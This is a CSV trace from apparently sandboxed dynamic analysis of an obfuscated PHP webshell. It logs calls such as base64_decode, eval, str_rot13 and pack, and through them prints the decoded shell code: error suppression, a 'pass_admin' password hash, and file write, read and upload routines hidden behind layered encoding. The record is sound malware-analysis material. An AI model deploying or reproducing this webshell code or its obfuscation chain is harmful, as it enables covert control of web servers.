uuid,file_md5,index,source,target,argc,argv,return,dynamic
cda8e562705d6ad8308f169dac2aa6a6,2b23e6f5a994c38d4caba512bc4cf1c2,0,__main__,zend_compile_file,2,{"value": []},{"value": "2626262608263B423D26423C122B49262A3E"},[]
cda8e562705d6ad8308f169dac2aa6a6,2b23e6f5a994c38d4caba512bc4cf1c2,1,__main__,base64_decode,1,"{""value"": [[0, ""str"", ""ZXJyb3JfcmVwb3J0aW5nKEVfRVJST1IpOwpAaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCdPZmYnKTsKQGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsMjAwMDApOw""]]}","{""value"": ""error_reporting(E_ERROR);\n@ini_set('display_errors','Off');\n@ini_set('max_execution_time',20000);\n@ini_set('memory_limit','256M');""}",[0]
cda8e562705d6ad8308f169dac2aa6a6,2b23e6f5a994c38d4caba512bc4cf1c2,2,__main__,strlen,1,"{""value"": [[0, ""str"", ""error_reporting(E_ERROR);\n@ini_set('display_errors','Off');\n@ini_set('max_execution_time',20000);\n@ini_set('memory_limit','256M');""]]}",{"value": 125724},[0]
cda8e562705d6ad8308f169dac2aa6a6,2b23e6f5a994c38d4caba512bc4cf1c2,3,__main__,eval,1,"{""value"": [[0, ""phpcode"", ""error_reporting(E_ERROR);\n@ini_set('display_errors','Off');\n@ini_set('max_execution_time',20000);\n@ini_set('memory_limit','256M');""]]}",{"value": null},[0]
cda8e562705d6ad8308f169dac2aa6a6,2b23e6f5a994c38d4caba512bc4cf1c2,4,eval,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""error_reporting(E_ERROR);\n@ini_set('display_errors','Off');\n@ini_set('max_execution_time',20000);\n@ini_set('memory_limit','256M');\nheader(\""content-Type: text/html; charset=utf-8\"");\n$password = \""b0aaddaf46490fb756cfe63767e6b463\""; //pass_admin\nfunction s(){\n\t$str = \""66756r6374696s6r20737472646972282473747229207o2072657475726r207374725s7265706p61636528617272617928275p5p272p272s2s272p27253237272p2725323227292p617272617928272s272p272s272p275p27272p272227292p63686s70282473747229293o207q0q0n66756r6374696s6r2063686o6770632824617272617929207o20666s72656163682824617272617920617320246o6579203q3r202476617229207o202461727261795o246o65795q203q2069735s6172726179282476617229203s2063686o677063282476617229203n207374726970736p61736865732824766172293o207q2072657475726r202461727261793o207q0q0n246q7966696p65203q20245s5345525645525o275343524950545s46494p454r414q45275q203s2073747264697228245s5345525645525o275343524950545s46494p454r414q45275q29203n20737472646972285s5s46494p455s5s293o0q0n246q7966696p65203q20737472706s7328246q7966696p652p276576616p28292729203s2061727261795s7368696674286578706p6s6465282728272p246q7966696p652929203n20246q7966696p653o0q0n646566696r65282754484953444952272p737472646972286469726r616q6528246q7966696p65292r272s2729293o0q0n646566696r652827524s4s54444952272p73747264697228737472747228246q7966696p652p61727261792873747264697228245s5345525645525o275048505s53454p46275q29203q3r20272729292r272s2729293o0q0n646566696r6528274558495354535s504850494r464s272p676574696r666s2829203s2074727565203n2066616p7365293o0q0n6966286765745s6q616769635s71756s7465735s677063282929207o20245s504s5354203q2063686o67706328245s504s5354293o207q0q0n69662866756r6374696s6r5s65786973747328276q7973716p5s636p6s7365272929207o2024697373716p203q20274q7953716p273o207q0q0n69662866756r6374696s6r5s65786973747328276q7373716p5s636p6s73652729292024697373716p202r3q2027202q204q7353716p273o0q0n69662866756r6374696s6r5s65786973747328276s63695s636p6s73652729292024697373716p202r3q2027202q204s7261636p65273o0q0n69662866756r6374696s6r5s65786973747328277379626173655s636p6s73652729292024697373716p202r3q2027202q20537942617365273o0q0n69662866756r6374696s6r5s657869737473282770675s636p6s73652729292024697373716p202r3q2027202q20506s737467726553716p273o0q0n2477696r203q20737562737472285048505s4s532p302p3329203q3q202757494r27203s2074727565203n2066616p73653o0q0n246q7367203q2056455253494s4r3o0q0n0q0n66756r6374696s6r2066696p6577282466696p656r616q652p2466696p65646174612p2466696p656q6s646529207o0q0n09696628282169735s7772697461626p65282466696p656r616q6529292026262066696p655s657869737473282466696p656r616q652929207o2063686q6s64282466696p656r616q652p30363636293o207q0q0n092468616r646p65203q20666s70656r282466696p656r616q652p2466696p656q6s6465293o0q0n09246o6579203q206670757473282468616r646p652p2466696p6564617461293o0q0n0966636p6s7365282468616r646p65293o0q0n0972657475726r20246o65793o0q0n7q0q0n0q0n66756r6374696s6r2066696p6572282466696p656r616q6529207o0q0n092468616r646p65203q20666s70656r282466696p656r616q652p277227293o0q0n092466696p6564617461203q206672656164282468616r646p652p66696p6573697n65282466696p656r616q6529293o0q0n0966636p6s7365282468616r646p65293o0q0n0972657475726r202466696p65646174613o0q0n7q0q0n0q0n66756r6374696s6r2066696p6575282466696p656r616q65612p2466696p656r616q656229207o0q0n09246o6579203q206q6s76655s75706p6s616465645s66696p65282466696p656r616q65612p2466696p656r616q656229203s2074727565203n2066616p73653o0q0n0969662821246o657929207o20246o6579203q20636s7079282466696p656r616q65612p2466696p656r616q656229203s2074727565203n2066616p73653o207q0q0n0972657475726r20246o65793o0q0n7q0q0n0q0n66756r6374696s6r2066696p6564282466696p656r616q6529207o0q0n096966282166696p655s657869737473282466696p656r616q6529292072657475726r2066616p73653o0q0n096s625s656r645s636p65616r28293o0q0n09246r616q65203q20626173656r616q65282466696p656r616q65293o0q0n09246172726179203q206578706p6s646528272r272p246r616q65293o0q0n096865616465722827436s6r74656r742q747970653n206170706p69636174696s6r2s782q272r61727261795s706s702824617272617929293o0q0n096865616465722827436s6r74656r742q446973706s736974696s6r3n206174746163686q656r743o2066696p656r616q653q272""]]}",{"value": "413C3941413C3A3941413C3A3941413C3A413C2600003C3E"},[0]
cda8e562705d6ad8308f169dac2aa6a6,2b23e6f5a994c38d4caba512bc4cf1c2,5,eval,error_reporting,1,"{""value"": [[0, ""new_error_level"", 1]]}",{"value": "void"},[0]
cda8e562705d6ad8308f169dac2aa6a6,2b23e6f5a994c38d4caba512bc4cf1c2,6,eval,ini_set,2,"{""value"": [[0, ""varname"", ""display_errors""], [1, ""newvalue"", ""Off""]]}",{"value": "void"},"[0, 0]"
cda8e562705d6ad8308f169dac2aa6a6,2b23e6f5a994c38d4caba512bc4cf1c2,7,eval,ini_set,2,"{""value"": [[0, ""varname"", ""max_execution_time""], [1, ""newvalue"", 20000]]}",{"value": "void"},"[0, 0]"
cda8e562705d6ad8308f169dac2aa6a6,2b23e6f5a994c38d4caba512bc4cf1c2,8,eval,ini_set,2,"{""value"": [[0, ""varname"", ""memory_limit""], [1, ""newvalue"", ""256M""]]}",{"value": "void"},"[0, 0]"
cda8e562705d6ad8308f169dac2aa6a6,2b23e6f5a994c38d4caba512bc4cf1c2,9,eval,header,1,"{""value"": [[0, ""header"", ""content-Type: text/html; charset=utf-8""]]}",{"value": "void"},[0]
cda8e562705d6ad8308f169dac2aa6a6,2b23e6f5a994c38d4caba512bc4cf1c2,10,eval,s,0,{"value": []},{"value": null},[]
cda8e562705d6ad8308f169dac2aa6a6,2b23e6f5a994c38d4caba512bc4cf1c2,11,s,str_rot13,1,"{""value"": [[0, ""str"", ""66756r6374696s6r20737472646972282473747229207o2072657475726r207374725s7265706p61636528617272617928275p5p272p272s2s272p27253237272p""]]}",{"value": "66756e6374696f6e20737472646972282473747229207b2072657475726e207374725f7265706c61636528617272617928275c5c272c272f2f272c27253237272c"},[0]
cda8e562705d6ad8308f169dac2aa6a6,2b23e6f5a994c38d4caba512bc4cf1c2,12,s,m,1,"{""value"": [[0, ""str"", ""66756e6374696f6e20737472646972282473747229207b2072657475726e207374725f7265706c61636528617272617928275c5c272c272f2f272c27253237272c""]]}",{"value": null},[0]
cda8e562705d6ad8308f169dac2aa6a6,2b23e6f5a994c38d4caba512bc4cf1c2,13,m,pack,2,"{""value"": [[0, ""format"", ""H*""], [1, ""args"", ""66756e6374696f6e20737472646972282473747229207b2072657475726e207374725f7265706c61636528617272617928275c5c272c272f2f272c27253237272c""]]}","{""value"": ""function strdir($str) { return str_replace(array('\\\\','//','%27','%22'),array('/','/','\\'','\""'),chop($str)); }\r\nfunction chkgpc($a""}","[0, 0]"
cda8e562705d6ad8308f169dac2aa6a6,2b23e6f5a994c38d4caba512bc4cf1c2,14,m,eval,1,"{""value"": [[0, ""phpcode"", ""function strdir($str) { return str_replace(array('\\\\','//','%27','%22'),array('/','/','\\'','\""'),chop($str)); }\r\nfunction chkgpc($a""]]}",{"value": null},[0]
